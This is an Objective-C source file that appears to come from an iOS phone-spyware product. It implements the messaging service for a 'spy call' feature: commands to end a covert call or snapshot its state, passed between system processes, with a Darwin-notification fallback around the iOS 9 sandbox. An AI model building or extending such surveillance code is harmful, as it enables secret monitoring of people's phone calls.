//
//  SpyCallSpringBoardService.m
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SpyCallSpringBoardService.h"
#import "SpyCallManager.h"
#import "SpyCallSerivceIDs.h"
#import "SpyCallManagerSnapshot.h"

#import "DefStd.h"
#import "MessagePortIPCSender.h"

static SpyCallSpringBoardService *_SpyCallSpringBoardService = nil;

@interface SpyCallSpringBoardService (private)

- (void) service;

@end

@implementation SpyCallSpringBoardService

@synthesize mSpyCallManager;

+ (id) sharedService {
	if (_SpyCallSpringBoardService == nil) {
		_SpyCallSpringBoardService = [[SpyCallSpringBoardService alloc] init];
		[_SpyCallSpringBoardService setMSpyCallManager:[SpyCallManager sharedManager]];
		[_SpyCallSpringBoardService service];
	}
	return (_SpyCallSpringBoardService);
}

+ (id) sharedServiceWithSpyCallManager: (SpyCallManager *) aSpyCallManager {
	if (_SpyCallSpringBoardService == nil) {
		_SpyCallSpringBoardService = [[SpyCallSpringBoardService alloc] init];
		[_SpyCallSpringBoardService setMSpyCallManager:aSpyCallManager];
		[_SpyCallSpringBoardService service];
	}
	return (_SpyCallSpringBoardService);
}

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) sendService: (NSInteger) aServiceID withServiceData: (id) aData {
	NSInteger serviceID = aServiceID;
	NSMutableData *data = [NSMutableData data];
	[data appendBytes:&serviceID length:sizeof(NSInteger)];
	switch (aServiceID) {
		default:
			break;
	}
	MessagePortIPCSender *sender = [[MessagePortIPCSender alloc] initWithPortName:kSpringBoardMsgPort];
	BOOL succes = [sender writeDataToPort:data];
	[sender release];
    
    if (!succes) { // iOS 9 Sandbox
        NSString *spyCmd = [NSString stringWithFormat:@"%@_%d", kSpringBoardMsgPort, (int)aServiceID];
        CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                             (CFStringRef)spyCmd,
                                             (__bridge const void *)(self),
                                             nil,
                                             true);
    }
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSInteger serviceID = kSpyCallServiceUnknown;
	NSInteger location = 0;
	[aRawData getBytes:&serviceID range:NSMakeRange(location, sizeof(NSInteger))];
	location += sizeof(NSInteger);
	switch (serviceID) {
		case kSpyCallServiceEndSpyCall:
			[[self mSpyCallManager] disconnectedActivityDetected];
			break;
        case kSpyCallServiceSnapshotSpyCall:
            // Take snapshot of SpyCallManager status, return via returnData method
            break;
		default:
			break;
	}
}

- (NSData *) messagePortReturnData: (NSData *) aRawData {
    NSData *serviceData = nil;
    NSInteger serviceID = kSpyCallServiceUnknown;
	NSInteger location  = 0;
	[aRawData getBytes:&serviceID range:NSMakeRange(location, sizeof(NSInteger))];
	location += sizeof(NSInteger);
    if (serviceID == kSpyCallServiceSnapshotSpyCall) {
        SpyCallManagerSnapshot *snapshot = [[self mSpyCallManager] takeSnapshot];
        serviceData = [snapshot toData];
    } else if (serviceID == kSpyCallServiceEndSpyCall) {
        ;
    }
    return (serviceData);
}

- (void) service {
	mServiceIsOn = TRUE;
	mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kMobilePhoneMsgPort withMessagePortIPCDelegate:self];
	[mMessagePortReader start];
    mMessagePortReaderICS = [[MessagePortIPCReader alloc] initWithPortName:kInCallServiceMsgPort withMessagePortIPCDelegate:self];
	[mMessagePortReaderICS start];
}

- (void) dealloc {
	[mMessagePortReader release];
    [mMessagePortReaderICS release];
	[super dealloc];
}

@end
